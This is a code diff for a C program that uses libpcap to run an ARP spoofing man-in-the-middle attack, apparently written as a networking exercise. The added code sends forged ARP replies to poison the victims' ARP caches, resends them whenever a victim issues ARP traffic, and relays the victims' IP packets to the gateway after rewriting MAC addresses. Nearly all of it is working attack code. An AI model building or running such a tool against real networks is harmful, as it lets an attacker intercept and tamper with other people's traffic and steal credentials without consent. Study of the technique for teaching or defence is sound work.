@@ -32,11 +32,28 @@ struct arp_header{
     uint8_t tip[4];
 };
 
+struct ip_header{
+    uint8_t version_and_length;
+    uint8_t type;
+    uint16_t length;
+    uint16_t identification;
+    uint16_t flag_and_offset;
+    uint8_t ttl;
+    uint8_t protocol;
+    uint16_t checksum;
+    uint8_t src_ip[4];
+    uint8_t dst_ip[4];
+};
+
 struct packet{
     struct ethernet_header eth;
     struct arp_header arp;
 };
 
+struct packet2{
+    struct ethernet_header eth;
+    struct ip_header ip;
+};
 
     // host -> me!
     // sender -> victim
@@ -126,13 +143,13 @@ void print_mac(uint8_t* mac){
     printf("MAC => %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
 }
 
-/*
-void send_fake_packet(pcap_t* handle, uint8_t* mymac, uint8_t* smac, uint8_t* sip, uint8_t* tip){
+
+void send_arp_reply (pcap_t* handle, uint8_t* smac, uint8_t* sip, uint8_t* tmac, uint8_t* tip){
     struct packet buf;
    
     // compose ethernet header
-    memcpy(buf.eth.dst_mac, smac, 6);
-    memcpy(buf.eth.src_mac, mymac, 6);
+    memcpy(buf.eth.dst_mac, tmac, 6);
+    memcpy(buf.eth.src_mac, smac, 6);
     memcpy(buf.eth.type, "\x08\x06", 2);
     // compose arp header
     memcpy(buf.arp.hd_type, "\x00\x01", 2);
@@ -140,23 +157,34 @@ void send_fake_packet(pcap_t* handle, uint8_t* mymac, uint8_t* smac, uint8_t* si
     buf.arp.hd_len = '\x06';
     buf.arp.pr_len = '\x04';
     memcpy(buf.arp.opcode, "\x00\x02", 2); // reply
-    memcpy(buf.arp.smac, mymac, 6);
-    memcpy(buf.arp.sip, tip, 4);
-    memcpy(buf.arp.tmac, smac, 6);
-    memcpy(buf.arp.tip, sip, 4);
+    memcpy(buf.arp.smac, smac, 6);
+    memcpy(buf.arp.sip, sip, 4);
+    memcpy(buf.arp.tmac, tmac, 6);
+    memcpy(buf.arp.tip, tip, 4);
    
-    int i=1; 
-    while(true){
-        if(!pcap_sendpacket(handle, (uint8_t)buf, 60)){ 
-            printf("[%d] send packet....\n", i);
-            i++;
-        } else {
-            fprintf(stderr, "send packet error!\n");
-        }
-    }
-
+    pcap_sendpacket(handle, (const u_char*)&buf, 60);    
 }
-*/
+
+bool check_sender_to_target(const u_char* packet, session sess){
+    struct ethernet_header eth;
+    struct ip_header ip;
+    int type;
+
+    memcpy(&eth, packet, 14);
+    memcpy(&ip, packet+14, 20);
+    type = (eth.type[0]<<8 | eth.type[1]);
+    if(type == 0x0800) {
+	if(!memcmp(eth.src_mac, sess.smac, 6) && !memcmp(eth.dst_mac, sess.tmac, 6)) return true;
+    }
+    return false;
+}
+
+void render_packet(const u_char* p, uint8_t* mymac, session sess){
+    struct packet2* packet = (packet2*)p;
+    memcpy(packet->eth.src_mac, mymac, 6);
+    memcpy(packet->eth.dst_mac, sess.tmac, 6);
+}
+
 
 int main(int argc, char* argv[]){
 
@@ -199,9 +227,34 @@ int main(int argc, char* argv[]){
     }
   
     // send fake reply and initialize target arp cache table
-    // reply sender's packet to gateway
-    // 
-      
+    for (int i=0; i<session_num; i++) send_arp_reply(handle, mymac, sessions[i].tip, sessions[i].smac, sessions[i].sip);
+
+    while (true) {
+        struct pcap_pkthdr* header;
+        const u_char* packet;
+        int res = pcap_next_ex(handle, &header, &packet);
+        if (res == 0) continue;
+        if (res == -1 || res == -2) break;
+        printf("%u bytes captured\n", header->caplen);
+        // infect arp table
+ 
+        for (int i=0; i<session_num; i++){
+            if(check_arp(packet, sessions[i].smac)){
+                send_arp_reply(handle, mymac, sessions[i].tip, sessions[i].smac, sessions[i].sip);
+	        continue;
+            }
+	}
+
+        // relay sender's packet to gateway
+        for (int i=0; i<session_num; i++){ 
+            if(check_sender_to_target(packet, sessions[i])){
+                // pass packet to gateway
+                render_packet(packet, mymac, sessions[i]); 
+    		pcap_sendpacket(handle, packet, header->caplen);    
+            }
+        }
+    }
+     
  
     return 0;
 }
